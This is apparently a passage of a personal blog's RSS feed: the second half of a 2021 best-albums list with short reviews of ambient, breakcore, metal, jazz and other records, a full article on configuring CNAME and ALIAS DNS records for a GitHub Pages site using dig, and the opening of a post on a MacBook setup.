<p>Over to something completely different to the above (and below) albums.  Dean McPhee, a UK based solo ambient and folk guitarist which I discovered through his previous record called <a href="https://deanmcphee.bandcamp.com/album/four-stones">Four Stones</a>.  Witch's Ladder is inspired by folklore, mysticism and the beautiful, wide open and lonely landscapes of northern England.</p>
<p>An album best listened to on a quiet evening with a wood fire or while watching the world fly by through a train window.  Enjoy.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=3681494736/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://deanmcphee.bandcamp.com/album/witchs-ladder">Witch&#39;s Ladder by Dean McPhee</a></iframe>
<h2>Stazma the Junglechrist</h2>
<h3>Stazma — Leftovers</h3>
<p><img src="https://f4.bcbits.com/img/a0248618665_16.jpg" alt="Album Art of Stazma - Leftovers"></p>
<p>Stazma's leftovers are better than some other's best productions.  I have a soft spot for blazing breakcore beats, especially when they incorporate well versed rapping or funky Squarepusher'esque basslines on top.  There are dozens of excellent breakcore producers in France, <a href="https://rubymydear.bandcamp.com/">Ruby my Dear</a> or <a href="https://igorrr.bandcamp.com/">Igorrr</a> for example.  Still, Stazma is a master of his craft and shares his production techniques, like Woulg, with the rest of the world on <a href="https://www.youtube.com/channel/UCOiJihb6aQyKch4FDST3niw">YouTube</a>.</p>
<p>If you haven't gotten bored by the Amen break yet, and if you like hard and fast break beats then this is something you should listen to.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=4185536392/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://stazma-the-junglechrist.bandcamp.com/album/leftovers">Leftovers by Stazma</a></iframe>
<h3>Repeat Eater — Deep Dessert Dweller</h3>
<p><img src="https://f4.bcbits.com/img/a0219005911_16.jpg" alt="Album Art of Repeat Eater - Deep Desert Dweller"></p>
<p>We aren't done with Stazma yet, even though this record was released under his alter ego <em>Repeat Eater</em>.  He produces detroit style techno or electro under this moniker.  The album was inspired by Frank Herbert's Dune, a story that received a <a href="https://www.youtube.com/watch?v=n9xhJrPXop4">very fine movie remake</a> this year.</p>
<p>Perfect music for driving on the Autobahn or to dance alone in your living room until the clubs reopen.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2268299090/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://touched.bandcamp.com/album/deep-desert-dweller">Deep Desert Dweller by Repeat Eater</a></iframe>
<h2>Harold Budd — Abandoned Cities</h2>
<p><img src="https://f4.bcbits.com/img/a2697139059_16.jpg" alt="Album Art of Harold Budd - Abandoned Cities"></p>
<p>Yet another album from a master of his genre.  Not a 2021 release, strictly speaking, but a re-release of Harold Budds' 1984 record <em>Abandoned Cities</em>.  This one is much darker than his other works and reminds me a bit of the early <a href="https://www.discogs.com/artist/10343-Tangerine-Dream">Tangerine Dream</a>.  Most mystery or sci-fi movies would benefit from a soundtrack like this.</p>
<p>A soundtrack for being outside on a starry night, but only if you're not afraid of the dark.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2344114403/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://haroldbudd.bandcamp.com/album/abandoned-cities">Abandoned Cities by Harold Budd</a></iframe>
<h2>Clark — Playground in a Lake</h2>
<p><img src="https://throttleclark.com/wp-content/uploads/2021/04/218911-2.png" alt="Album Art of Clark - Playground in a Lake"></p>
<p>Playground in a Lake, released on <a href="https://www.deutschegrammophon.com/">Deutsche Grammophon</a>, is a special album for Clark's standards.  The record starts with a cello melody that reminds me of <a href="https://www.youtube.com/watch?v=xULTMMgwLuo">The Elder Scrolls: Morrowind</a><sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup> soundtrack, which has to be taken as a compliment, I really like that one.  Clark, previously producing IDM or braindance records on <a href="https://warp.net/">Warp</a>, releases a very solid contemporary classic album here, that involves all his experience, with epic sound walls, catchy melodies and mysterious vibes alike.</p>
<p>This is a record for people pretending not to like classical music but are overwhelmed by good old Hollywood soundtracks.</p>
<p><a href="https://throttleclark.com/album/playground-in-a-lake/">https://throttleclark.com/album/playground-in-a-lake/</a></p>
<h2>Tommy Guerrero — Sunshine Radio</h2>
<p><img src="https://f4.bcbits.com/img/a1891857574_16.jpg" alt="Album Art of Tommy Guerrero - Sunshine Radio"></p>
<p>The californian Tommy Guerrero, former pro skateboarder, now a professional musician is living the dream (at least I hope he does &#x1f605;).  His music is best described as a fusion of Instrumental Rock, Jazz, Funk and Downtempo<sup id="fnref:2"><a href="#fn:2" class="footnote-ref" role="doc-noteref">2</a></sup> influenced by hot shimmering air, cacti, yucca, agaves and tequila at sundown.  Okay, that's just my mental picture of his music but I still think it gives you an idea of what to expect.</p>
<p>Hear this, or his other records, if you want to get in a good mood or if you want to relax on a hot summer evening.  Best listened to with friends, some beers and a joint &#x1f33f;.</p>
<iframe style="border: 0; width: 560px; height: 435px;" src="https://bandcamp.com/VideoEmbed?track=374561757&bgcol=333333&linkcol=0f91ff" mozallowfullscreen="1" webkitallowfullscreen="1" allowfullscreen="1" seamless></iframe>
<h2>Loscil — Clara</h2>
<p><img src="https://f4.bcbits.com/img/a3445442629_16.jpg" alt="Album Art of Loscil - Clara"></p>
<p>An ambient gem released on <a href="https://kranky.bandcamp.com/">Kranky</a>, one of the few record labels I really admire because of their consistently great output.  Loscil has a large back catalogue of great ambient albums, and this one is no different.  Sourced from a three minute record of an Hungarian twenty-two string orchestra the album has a more natural touch than ambient records produced completely inside the box, i.e. by software synths.  Nothing against software synths and artificial sounds, but sometimes sampling real instruments gives the little touch which makes a good album into a great one.</p>
<p>Perfect album to listen to on a trip to Scandinavia or Canada in autumn or winter months.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=4149141204/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://loscil.bandcamp.com/album/clara">Clara by loscil</a></iframe>
<h2>Simon Farintosh — Aphex Twin for Guitar</h2>
<p><img src="https://www.thisisclassicalguitar.com/wp-content/uploads/2021/02/Aphex-Twin-Guitar-Farintosh-1024x924.png" alt="Album Art of Simon Farintosh - Aphex Twin for Guitar"></p>
<p>There are not many artists that had a greater influence on my music taste and life in general than <a href="https://aphextwin.warp.net/">Aphex Twin</a>, <a href="https://autechre.warp.net/">Autechre</a> and <a href="https://venetiansnares.bandcamp.com/">Venetian Snares</a>.  I love everything they do and especially what they did.  In 2005 <em>Alarm Will Sound</em> released <a href="https://alarmwillsound.bandcamp.com/album/acoustica">Acoustica</a>, an orchestral interpretation of Aphex' early work.  No different is this record of Simon Farintosh, another UK based guitarist.</p>
<p>Listen to this if you like Aphex Twin, if not listen to it as well.  You don't have a choice.</p>
<p><a href="https://open.spotify.com/album/0mhEjBVbHDLAhwGD9ZydfY?si=HRzrCHMhRdegQ3VzXqzbVg&amp;nd=1">https://open.spotify.com/album/0mhEjBVbHDLAhwGD9ZydfY?si=HRzrCHMhRdegQ3VzXqzbVg&amp;nd=1</a></p>
<h2>Darkthrone — Eternal Hails......</h2>
<p><img src="https://f4.bcbits.com/img/a1849020328_16.jpg" alt="Album Art of Darkthrone - Eternal Hails......"></p>
<p>I do not know much about Norwegian black/heavy metal institution Darkthrone, except that I like this album.  Mainly because it's rough and primitive, both in terms of sound and atmosphere.  Nothing is worse than those hipster metal bands with their crystal clear productions and triggered base drums.  A solid black metal album must be a bit filthy, and this one is filthy enough without sounding like it was recorded in a bathroom through an 80s cassette recorder (this is the other extreme).</p>
<p>Do you hate social media as much as I do?  If so, this is the album for you.  Otherwise, just head over to Twitter and annoy like minded people with your garbage.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=1173323261/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://peaceville.bandcamp.com/album/eternal-hails">Eternal Hails...... by Darkthrone</a></iframe>
<h2>VC-118A — Spiritual Machines</h2>
<p><img src="https://f4.bcbits.com/img/a1898546476_16.jpg" alt="Album Art of VC-118A - Spiritual Machines"></p>
<p>Finland based producer VC-118A makes electro that almost counts as braindance or IDM.  Groovy beats combined with rattling percussion, spheric drones, glitchy artifacts and shimmering reverb.  An album that would even make HAL-9000 <a href="https://www.youtube.com/watch?v=YjQJeMF7HM8">dance like he's selling nails</a><sup id="fnref:3"><a href="#fn:3" class="footnote-ref" role="doc-noteref">3</a></sup>.</p>
<p>Have you booked your first trip to space?  This is the album you should hear on your way into orbit.</p>
<iframe style="border: 0; width: 560px; height: 435px;" src="https://bandcamp.com/VideoEmbed?track=1434495374&bgcol=333333&linkcol=0f91ff" mozallowfullscreen="1" webkitallowfullscreen="1" allowfullscreen="1" seamless></iframe>
<h2>Savana Funk — Tindouf</h2>
<p><img src="https://f4.bcbits.com/img/a2332196434_16.jpg" alt="Album Art of Savana Funk - Tindouf"></p>
<p>Production on this record is not very great, the noise floor is loud enough that you can hear it even on speakers, let alone headphones.  However, the music easily makes up for this luxury problem.  With Tindouf Savana Funk has recorded a fantastic funk album that takes influences from north african music and feels timeless, in the sense that it could have been produced in the 70s as well.</p>
<p>This could be the soundtrack for your next trip to Algeria or Morocco, or to Italy, because that's where the band is located.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=1166271148/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://savanafunk.bandcamp.com/album/tindouf">Tindouf by SAVANA FUNK</a></iframe>
<h2>Wolff Parkinson White</h2>
<p><a href="https://www.jochenrueckert.net/#wolff-parkinson-white">Jochen Rueckert</a>, a New York based Jazz Drummer, is releasing experimental electronic records with very complex rhythmic patterns and pretty uncommon melodies under his moniker <em>Wolff Parkinson White</em>.  I would label his music as breakcore or IDM.  Album descriptions of his Wolff Parkinson White records always state that <em>&quot;Jochen does not play drums on this recording&quot;</em>.  I would assume that no real human could play those drum patterns anyway &#x1f916;.</p>
<h3>Veritable Rapunzel</h3>
<p><img src="https://f4.bcbits.com/img/a1622753268_16.jpg" alt="Album Art of Wolff Parkinson White - Veritable Rapunzel"></p>
<p>A Cambrian explosion of samples, thrown at you in supersonic speed and razor-sharp precision.  This last sentence is utter nonsense but I always wanted to include the <em>Cambrian explosion</em> into a review.  Anyways, Veritable Rapunzel is a chaotic mess that forces you into a sensory overload, if listened in full and twice in a row.  Just give it a listen and you will know what I mean.</p>
<p>If CPUs could dream in sleep mode this would be their soundtrack.</p>
<iframe style="border: 0; width: 560px; height: 435px;" src="https://bandcamp.com/VideoEmbed?track=3924502164&bgcol=333333&linkcol=0f91ff" mozallowfullscreen="1" webkitallowfullscreen="1" allowfullscreen="1" seamless></iframe>
<h3>Off World</h3>
<p><img src="https://f4.bcbits.com/img/a0162131558_16.jpg" alt="Album Art of Wolff Parkinson White &amp; Jayden Chisholm - Off World"></p>
<p>Rueckert's second release this year.  This time featuring Hayden Chrisholm, who does vocals on this album.  The record is a bit more jazzy than <em>Veritable Rapunzel</em>, yet it still has hyper complex beats with melodic elements that sometimes feel (intentionally) out of tune.  I would say that those ultra fast polyrhythmic beats with the slightly skewed melodics are Wolff Parkinson White's signature sound.  Advanced listening material.</p>
<p>An album to impress an artsy-fartsy person whose favorite cocktail is a cosmopolitan.</p>
<iframe style="border: 0; width: 560px; height: 435px;" src="https://bandcamp.com/VideoEmbed?track=3696636598&bgcol=333333&linkcol=0f91ff" mozallowfullscreen="1" webkitallowfullscreen="1" allowfullscreen="1" seamless></iframe>
<h2>Heliochrysum — We Become Mist</h2>
<p><img src="https://f4.bcbits.com/img/a0912067017_16.jpg" alt="Album Art of Heliochrysum - We Become Mist"></p>
<p>This is the debut album of the Los Angeles based composer and sound designer duo Heliochrysum.  When hearing this album for the first time it reminded me of Blade Runner.  Production on this album is top notch, we get a great mixture of industrial like noises, massive drones, piano sounds and sometimes a heavy bass drum hit.  Everything about this album feels cinematic, which might be because <a href="https://en.wikipedia.org/wiki/Ben_Frost">Ben Frost</a> did the final mix.  I really hope that we see another album of the duo in the near future.</p>
<p>Have you watched the launch of the James Webb space telescope?  This is your album then!</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=3755221744/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://heliochrysum.bandcamp.com/album/we-become-mist">We Become Mist by Heliochrysum</a></iframe>
<h2>Pessimista - Ocaso</h2>
<p><img src="https://f4.bcbits.com/img/a0718026457_16.jpg" alt="Album Art of Pessimista - Ocaso"></p>
<p>This best of list is really a roller coaster ride of musical genres.  Ocaso is a rather simple Black Metal album and in no terms perfect, but I do like its rawness combined and the punk rock influence.  My favorite track is <em>Se Ícaro soubesse o que sei agora...</em> which translates to <em>If Icarus knew what I know now...</em> if we can trust Google translate.  The record reminds me of black metal concerts in dark, shabby and smoky clubs.  Let's hope that there will be (more) concerts again in 2022.</p>
<p>Perfect album for one who sees the glass as half empty.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=3120607925/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://pessimista.bandcamp.com/album/ocaso">Ocaso by Pessimista</a></iframe>
<h2>Crypt Monarch — The Necronaut</h2>
<p><img src="https://f4.bcbits.com/img/a1170320464_16.jpg" alt="Album Art of Crypt Monarch - The Necronaut"></p>
<p>This should be the first doom metal LP in the list.  Due to their bass heavy, down tuned and slow riffs listening to doom metal is almost meditative.  Of course, the more than 10 minute runtime for every track are an important factor as well.  I do like to listen to doom, be it stoner doom or whatever sub genre, while programming because it's not obtrusive and helps to concentrate on the work.  So, what makes this album special now?  I actually do not know, there's just the fact that I listened to it multiple times and that it feels very solid, sound and production wise.</p>
<p>&#x1f6b6; &#x1f3d9;&#xfe0f; &#x1f33f;</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=4231458351/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://cryptmonarch.bandcamp.com/album/the-necronaut">The Necronaut by Crypt Monarch</a></iframe>
## Tarika Blue — Self Titled
<p><img src="https://f4.bcbits.com/img/a3851404934_16.jpg" alt="Album Art of Tarika Blue - Self Titled"></p>
<p>Tarika Blue's self titled album is not a 2021 release, instead its a reissue of the record originally released in 1974.  Their music is best described as a fusion of jazz, soul and disco.  <a href="https://www.whosampled.com/sample/8049/Erykah-Badu-Didn%27t-Cha-Know-Tarika-Blue-Dreamflower/">Erykah Badu sampled</a> the track <em>Dreamflower</em> on her 2001 hit <em>Didn't Cha Know</em>.  Super smooth record, great vocals, nice guitar licks and funky drums.</p>
<p>Too good to be just a sample source for hip hop beats, give it a spin and hear for yourself.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=1278846107/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://eatingstanding.bandcamp.com/album/tarika-blue">Tarika Blue by Tarika Blue</a></iframe>
<h2>Swami Lateplate — Doom Jazz</h2>
<p><img src="https://f4.bcbits.com/img/a4055416360_16.jpg" alt="Album Art of Swami Lateplate - Doom Jazz"></p>
<p>Doom Jazz is a self describing tite and tells you exactly where to put this album.  If you know <a href="https://en.wikipedia.org/wiki/Bohren_%26_der_Club_of_Gore">Bohren &amp; der Club of Gore</a> then this sound will be familiar to you.  I really like that this albums comes without brass instruments and vocals.  It's pretty hard to find a good jazz record that is not drowned in saxophone nonsense, for some reason sax players often need to show off and give solo parts that almost sound like they're on the edge of getting a heart attack.</p>
<p>Best played on headphones while slandering through barely lit side streets on a rainy, full moon summer night.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=718302455/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://swamilateplate.bandcamp.com/album/doom-jazz">Doom Jazz by Swami Lateplate</a></iframe>
<h2>Worm — Foreverglade</h2>
<p><img src="https://f4.bcbits.com/img/a1911764557_16.jpg" alt="Album Art of Worm - Foreverglade"></p>
<p>Florida death metal outfit Worm is gifting us with a real banger on the <a href="https://listen.20buckspin.com/">20 Buck Spin</a> label<sup id="fnref:4"><a href="#fn:4" class="footnote-ref" role="doc-noteref">4</a></sup>.  Not sure how to label this album, maybe death metal or funeral doom, does not really matter anyways because the music is absolutely excellent and miles above their previous, debut album.  Let me admit that I'm the type of guy how rates an album by its cover, and let me tell you that this method works in at least <a href="https://en.wikipedia.org/wiki/Pareto_principle">four out of five cases</a>.  This is one of those four cases, I mean just look at this cover, as if M. C. Escher and Hieronymus Bosch had a frankensteinian love child (however that could be).  A no bullshit record that keeps on giving over the whole playtime, highly recommended.</p>
<p>Ever did a tour thorugh the Florida swamps?  Me neither, but if you do, take this album with you.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=713549408/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://listen.20buckspin.com/album/foreverglade">Foreverglade by Worm</a></iframe>
<h2>HunoHuno — Pleasant Valley</h2>
<p><img src="https://f4.bcbits.com/img/a1292322732_16.jpg" alt="Album Art of HunoHuno - Pleasant Valley"></p>
<p><a href="https://detroitunderground.net/du-vhs/?v=79xpFvxFbvc">Detroit Underground</a>, a label best known for their excellent IDM and techno releases, gives us a rather hard to categorize album here.  We could just put the IDM sticker on it, but that wouldn't do the record enough justice.  A mad scientist mixture of sounds, textures and glitch hop style beats.</p>
<blockquote>
<p>Pleasant Valley Detour is the first part of a musical project that seeks to interpret the mystery of the daily journey into the unknown.</p>
</blockquote>
<p>Above sentence stems from the Bandcamp record description and gives me hope that there will be subsequent releases to this album.  For some reason they labeled it Pleasant Valley <em>Detour</em>, which might indicates that there will be follow ups as well.</p>
<p>Not recommended for driving (judging by its album art).</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=3772356991/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://detund.bandcamp.com/album/pleasant-valley">Pleasant Valley by HunoHuno</a></iframe>
<h2>MC Solaar - Prose Combat</h2>
<p><img src="https://img.discogs.com/VrvsVa9uPArdXgNzAg4PVexWlzU=/fit-in/600x600/filters:strip_icc():format(jpeg):mode_rgb():quality(90)/discogs-images/R-20348713-1632585572-9925.jpeg.jpg" alt="Album Art of MC Solaar - Prose Combat"></p>
<p>Yet another reissue, this time a french hip hop classic originally put out in 1994 and that I managed to miss in my teenage years, much later, where I thought to have discovered everything there is rap-wise<sup id="fnref:5"><a href="#fn:5" class="footnote-ref" role="doc-noteref">5</a></sup>.  <a href="https://en.wikipedia.org/wiki/Boom_bap">Boom bap</a> beats are totally my thing and luckily this style has seen a revival in recent years, even though mostly in the undergroud.  I just can't stand those rattling hi-hat trap beats every mumbling rapper uses nowadays, especially since they all sound the same.  No, this is not <em>old man yelling at couds</em>, I am allowed to hate things!  <a href="https://www.imdb.com/title/tt0113247/">La Haine</a>, a movie about youth life in french suburbs of the 90s, features <em>Comme Dans Un Film</em> (like in a movie) which was an outtake of Prose Combat.  A record that perfectly captures the aestehtics of the time, which makes it sound a bit dated but sometimes this is desired and must not be seen as a disadvantage.</p>
<p>No need to speak french to listen to this one, a record made for summer evenings.</p>
<p><a href="https://www.discogs.com/release/20348713-MC-Solaar-Prose-Combat">https://www.discogs.com/release/20348713-MC-Solaar-Prose-Combat</a></p>
<h2>Submotion Orchestra — Finest Hour</h2>
<p><img src="https://f4.bcbits.com/img/a2343263499_16.jpg" alt="Album Art of Submotion Orchestra - Finest Hour"></p>
<p>I am sorry for having another reissue in the list, but that's how it is.  Actually I'm not sorry at all because this album is a bloody gem and your life will be worse if you have never listened to it!  Submotion Orchestra are a seven piece band from England that are influenced by soul, dub(step), electronica and trip-hop.  I have no idea how this record, released in 2009, could fly under my radar until this year.</p>
<p>A record so versatile that it fits any time and moment, ideally the more mellow ones.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=3033307561/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://submotionorchestra.bandcamp.com/album/finest-hour">Finest Hour by Submotion Orchestra</a></iframe>
<h2>Otto A Totland - Companion</h2>
<p><img src="https://f4.bcbits.com/img/a3487084709_16.jpg" alt="Album Art of Otto A Totland - Companion"></p>
<p>Already bored by Nils Frahm?  Then this could be something for you.  With <em>Companion</em> norwegian composer Otto A. Totland, one half of the legendary ambient duo <a href="https://www.discogs.com/artist/170843-Deaf-Center">Deaf Center</a>, put out an album of piano compositions recorded at Nils Frahm's Berlin studio (that brings us right back to the start).  Despite most piano records I heard this has a very positive tone, that makes it special for me.  When you're done listening to this album you can continue with Totland's previous two albums, <em>The Lost</em> and <em>Pinô</em>, both not as cheerful as this one.</p>
<p>When everything is fine listen to this album.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=2805599072/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://ottoatotland.bandcamp.com/album/companion">Companion by Otto A Totland</a></iframe>
<h2>Bleach Lab — Nothing Feels Real</h2>
<p><img src="https://f4.bcbits.com/img/a0705886315_16.jpg" alt="Album Art of Bleach Lab - Nothing Feels Real"></p>
<p>Nothing Feels Real seems to be out of time and, without a doubt, could have been an early 90s shoegaze album.  I was really on the fence with adding this one to the list but eventually decided to put it in anyways.  No further description.</p>
<p>An album for people who like Slowdive, My Bloody Valentine or Cocteau Twins.</p>
<iframe style="border: 0; width: 100%; height: 120px;" src="https://bandcamp.com/EmbeddedPlayer/album=907174083/size=large/bgcol=333333/linkcol=0f91ff/tracklist=false/artwork=small/transparent=true/" seamless><a href="https://bleachlab.com/album/nothing-feels-real-ep">Nothing Feels Real EP by Bleach Lab</a></iframe>
<hr>
<p>Writing those short reviews was much fun and is something I should do more regularly, even though in smaller batches and not for almost 30 albums at a time.  Also, note that the albums were added in no particular order or relevance.  There were tons of other records I could have added but they did not fit because they either weren't released in 2021 nor reissued.</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>I think that's the last video game I played for hours non-stop.&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:2" role="doc-endnote">
<p>Better known as Balearic. (Sorry, that was an insider joke.)&#160;<a href="#fnref:2" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:3" role="doc-endnote">
<p>When did planet-mu stop releasing good music?  Everything they put out in recent years is embarrassing garbage that is just a bit to edgy to be released on Stones Throw.&#160;<a href="#fnref:3" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:4" role="doc-endnote">
<p>You should follow this label, they have a very solid track record of album releases.&#160;<a href="#fnref:4" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
<li id="fn:5" role="doc-endnote">
<p>A foolish thought, there is always some great album left to discover.&#160;<a href="#fnref:5" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>GitHub Pages DNS Setup</title>
      <link>https://klingt.net/articles/github-pages-dns-setup.html</link>
      <description>In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  
  <meta name="description" content="In this article I describe the DNS setup for my GitHub Pages website which is served under the www subdomain and the apex or base domain.">
  
  <title>GitHub Pages DNS Setup</title>

  <link rel="icon" type="image/svg+xml" href='https://klingt.net/assets/logo.svg'>
  <link rel="apple-touch-icon" href='https://klingt.net/assets/logo-apple-touch-icon.png'>

  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraCode/fira_code.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/fonts/FiraGO/fira_go.css' />
  <link rel="stylesheet" type="text/css" href='https://klingt.net/assets/base.css' />
  
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github.min.css"
    media="screen and (prefers-color-scheme: light)" />
  <link rel="stylesheet" href="//unpkg.com/@highlightjs/cdn-assets@11.0.1/styles/github-dark.min.css"
    media="screen and (prefers-color-scheme: dark)" />
  <script src="//unpkg.com/@highlightjs/cdn-assets@11.0.1/highlight.min.js"></script>
  <script defer>
    hljs.highlightAll();
  </script>
  <script type="text/javascript">new Image().src='https://nullitics.com/n.gif?u=' + encodeURI(location.href) + '&r=' + encodeURI(document.referrer) + '&d=' + screen.width;</script>
</head>

<body>
  <div class="wrapper">
    <div class="main">
      <main>
        
<h1>GitHub Pages DNS Setup</h1>
<p>I chose <a href="https://guides.github.com/features/pages/">GitHub Pages</a> to serve <a href="https://github.com/klingtnet/klingtnet.github.io">this website</a>.  By default a GitHub Pages website is served under <code>&lt;repo&gt;.github.io</code>, which is fine but not what I wanted.  As this is a replacement for my old website I wanted it to be served under my domain <code>klingt.net</code>.</p>
<p>Fortunately, setting up a GitHub pages website is pretty easy.  Just create a repository and set the branch and directory which contains the website files in the repositories Pages settings.  <sup id="fnref:1"><a href="#fn:1" class="footnote-ref" role="doc-noteref">1</a></sup></p>
<p><img src="/articles/github-pages-settings-source-dialog.png" alt="GitHub Pages settings source dialog"></p>
<p>Adding a custom domain is also straightforward and <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains">GitHub's excellent documentation has you covered</a> as usual.  For my case I wanted to serve this website to be served under the <code>www</code> subdomain, that is <code>www.klingt.net</code>, and the apex or base domain <code>klingt.net</code>.  Configuring an apex domain requires an additional step which is why I decided to write this article.</p>
<p>First things first, let's start with setting up the required DNS records.  For the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#supported-custom-domains"><code>www</code> subdomain</a> I just needed to add a <code>CNAME</code> record that points <code>www.klingt.net</code> to <code>klingtnet.github.io</code>.  I use <code>dig</code> for debugging or showing DNS records and in the following command you will see how to retrieve a <code>CNAME</code> record for a domain:</p>
<pre><code class="language-sh">$ dig +noall +answer www.klingt.net CNAME
www.klingt.net.         3600    IN      CNAME   klingtnet.github.io.
</code></pre>
<p>If you do not have a shell available, e.g. because you're reading this article from a phone or from a Windows machine &#x1f644;, you can use online tools liks <a href="https://dns-lookup.jvns.ca">https://dns-lookup.jvns.ca</a>.</p>
<p>Setting up the <a href="https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site/about-custom-domains-and-github-pages#using-an-apex-domain-for-your-github-pages-site">apex domain</a> is a bit more complicated because there are no <code>CNAME</code> records for this type of domain.  Instead, you can just define an <a href="https://support.dnsimple.com/articles/alias-record/"><code>ALIAS</code></a> record that—as the name suggests—alias <code>klingt.net</code> with <code>www.klingt.net</code>.  Let's do a DNS query using <code>dig</code> for the <code>ALIAS</code> record:</p>
<pre><code class="language-sh">$ dig +noall +answer klingt.net ALIAS
klingt.net.             929     IN      A       185.199.109.153
klingt.net.             929     IN      A       185.199.111.153
klingt.net.             929     IN      A       185.199.108.153
klingt.net.             929     IN      A       185.199.110.153
</code></pre>
<p>You might wonder why the <code>ALIAS</code> record is not showing up in the result.  This is perfectly fine because the name server resolves an ALIAS directly into A (IPv4) or AAAA (IPv6) records.</p>
<p>The last thing you need to do is to set the default domain under which your domain should be served, again in the Pages settings dialog of the GitHub repository:</p>
<p><img src="/articles/github-pages-settings-domain-dialog.png" alt="GitHub Pages settings domain dialog"></p>
<p>Doing this will create a <a href="https://github.com/klingtnet/klingtnet.github.io/blob/4bd965fa2772ccfc3c69bc5d22ed76d2b9fc65f0/static/CNAME"><code>CNAME</code> file</a> in the source branch that you've initially configured.  Make sure to pull the commit that created this file or manually add it to your website contents.</p>
<p>Et Voilà!  Your website should now be served under your custom domain with a valid HTTPS certificate.</p>
<section class="footnotes" role="doc-endnotes">
<hr>
<ol>
<li id="fn:1" role="doc-endnote">
<p>Configuring the source branch and directory is something I always forget to do and then I'm wondering why my website does not show up &#x1f605;&#160;<a href="#fnref:1" class="footnote-backref" role="doc-backlink">&#x21a9;&#xfe0e;</a></p>
</li>
</ol>
</section>


      </main>
    </div>
  </div>
</body>

</html>
]]></content:encoded>
      <author>Andreas Linz</author>
      <pubDate>Tue, 18 Oct 2022 06:48:58 +0000</pubDate>
    </item>
    <item>
      <title>My MacBook Air M1 setup</title>
      <link>https://klingt.net/articles/my-macbook-air-m1-setup.html</link>
      <description>I recently made myself a present and bought a MacBook Air M1.  This is my first macOS machine and in this article I will let you know which productivity tools I use, what other software and how my basic configuration looks like.</description>
      <content:encoded><![CDATA[<!doctype html>
<html lang="en">

<head>
  <meta charset="utf-8">
